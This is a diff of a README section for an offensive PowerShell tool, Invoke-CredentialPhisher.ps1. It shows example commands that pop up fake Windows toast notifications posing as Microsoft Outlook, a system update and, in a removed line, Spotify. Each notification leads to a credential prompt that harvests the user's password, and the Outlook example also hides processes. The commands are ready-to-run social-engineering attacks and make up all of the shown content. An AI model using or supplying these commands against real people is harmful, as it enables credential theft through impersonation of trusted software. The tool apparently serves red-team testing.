@@ -11,9 +11,6 @@ The first one is a powershell script to send toast notifications on behalf on an
 Outlook connection:  
 ```.\Invoke-CredentialPhisher.ps1 -ToastTitle "Microsoft Office Outlook" -ToastMessage "Connection to Microsoft Exchange has been lost.`r`nClick here to restore the connection" -Application "Outlook" -credBoxTitle "Microsoft Outlook" -credBoxMessage "Enter password for user '{emailaddress|samaccountname}'" -ToastType Application -HideProcesses```  
 
-Spotify account subsscription:  
-```.\Invoke-CredentialPhisher.ps1 -ToastTitle "Spotify Account Helper" -ToastMessage "Your Spotify Premium subscription will be cancelled at the end of this month" -Application "Spotify" -credBoxTitle "Spotify" -credBoxMessage "Enter your spotify username and password" -ToastType Application```  
-
 Updates are available:  
 ```.\Invoke-CredentialPhisher.ps1 -ToastTitle "Updates are available" -ToastMessage "Your computer will restart in 5 minutes to install the updates" -credBoxTitle "Credentials needed" -credBoxMessage "Please specify your credentials in order to postpone the updates" -ToastType System -Application "System Configuration" ```  
 
